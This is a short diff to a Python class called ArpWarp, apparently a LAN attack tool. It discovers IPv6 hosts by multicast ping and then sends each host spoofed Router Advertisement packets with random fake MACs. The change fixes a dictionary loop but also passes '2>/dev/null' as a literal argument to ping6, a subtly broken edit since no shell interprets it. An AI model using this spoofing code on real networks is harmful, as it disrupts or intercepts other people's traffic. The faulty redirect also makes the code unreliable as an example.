@@ -75,7 +75,7 @@ class ArpWarp:
     def get_all_hosts_ipv6(self) -> Dict[str, Union[None, str]]:
         ipv6_hosts = dict()
         ping_output = subprocess.check_output(['ping6', '-I', self.network_interface,
-                                               IPV6_MULTIC_ADDR, "-c", "3"]).decode()
+                                               IPV6_MULTIC_ADDR, "-c", "3", "2>/dev/null"]).decode()
         for line in ping_output.splitlines():
             s_idx = line.find(IPV6_LL_PREF)
             e_idx = line.find(f"%{self.network_interface}")
@@ -105,7 +105,7 @@ class ArpWarp:
         """
         * send every host a spoofed RA packet with a fake MAC, using the routers lladdr  # todo test
         """
-        for host_lladdr, host_hwaddr in self.host_ipv6s:
+        for host_lladdr, host_hwaddr in self.host_ipv6s.items():
             rand_mac = RandMAC()
             ether_packet = Ether(src=rand_mac, dst=host_hwaddr) if host_hwaddr else Ether(src=rand_mac)
             spoofed_ra = ether_packet / \
